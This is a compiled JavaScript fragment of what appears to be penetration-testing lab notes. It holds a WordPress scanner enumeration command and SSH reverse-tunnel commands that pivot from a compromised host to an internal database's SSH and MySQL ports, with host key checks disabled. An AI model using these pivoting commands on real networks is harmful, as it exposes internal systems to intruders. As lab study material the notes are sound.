"),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--url")]),s._v(" sandbox.local "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--enumerate")]),s._v(" ap,at,cb,dbe "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-o")]),s._v(" sandbox-wpscan "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-f")]),s._v(" cli-no-color\n")])])]),t("h2",{attrs:{id:"tunneling"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#tunneling"}},[s._v("#")]),s._v(" Tunneling")]),s._v(" "),t("h3",{attrs:{id:"ssh-tunnel"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#ssh-tunnel"}},[s._v("#")]),s._v(" SSH tunnel")]),s._v(" "),t("p",[s._v("To create a tunnel with a middle-machine that can access both internal network and external network where the attacking machine's IP is "),t("code",[s._v("192.168.119.194")]),s._v(" and the IP for the internal database is "),t("code",[s._v("10.5.5.11")]),s._v(" (with ports 22 and 3306 open) and the remote machine's IP is "),t("code",[s._v("10.11.1.250")])]),s._v(" "),t("p",[s._v("On the remote machine, run either:")]),s._v(" "),t("ol",[t("li",[s._v("Interactive (allows for password entering)"),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[s._v("ssh")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-R")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1122")]),s._v(":10.5.5.11:22 "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-R")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("13306")]),s._v(":10.5.5.11:3306 "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-o")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"UserKnownHostsFile=/dev/null"')]),s._v(" "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-o")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"StrictHostKeyChecking=no"')]),s._v(" omar2535@192.168.119.194\n")])])])])]),s._v(" "),t("p",[s._v("or")]),s._v(" "),t("ol",{attrs:{start:"2"}},[t("li",[s._v("Non-interactive (using SSH key)"),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[s._v("ssh")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-f")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-N")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-R")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1122")]),s._v(":10.5.5.11:22 "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-R")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("13306")]),s._v(":10.5.5.11:3306 "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-o")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"UserKnownHostsFile=/dev/null"')]),s._v(" "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-o")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"StrictHostKeyChecking=no"')]),s._v(" "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-i")]),s._v(" /tmp/keys/id_rsa omar2535@192.168.119.194\n")])])])])]),s._v(" "),t("p",[s._v("where the private key is on the tunnel machine and the public key given to the attacking machine:")]),s._v(" "),t("p",[t("code",[s._v("~/.ssh/authorized_keys")])]),s._v(" "),t("div",{staticClass:"language-sh extra-class"},[t("pre",{pre:!0,attrs:{class:"language-sh"}},[t("code",[t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("from")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"10.11.1.250"')]),s._v(",command"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("\"echo 'Only port forwarding allowed'\"")]),s._v(",no-agent-forwarding,no-X11-forwarding,no-pty ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC94/"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("..")]),s._v(".\n")])])]),t("p",[s._v("and the ssh service is started using "),t("code",[s._v("systemctl start ssh.socket")])])])}),[],!1,null,null,null);t.default=r.exports}}]);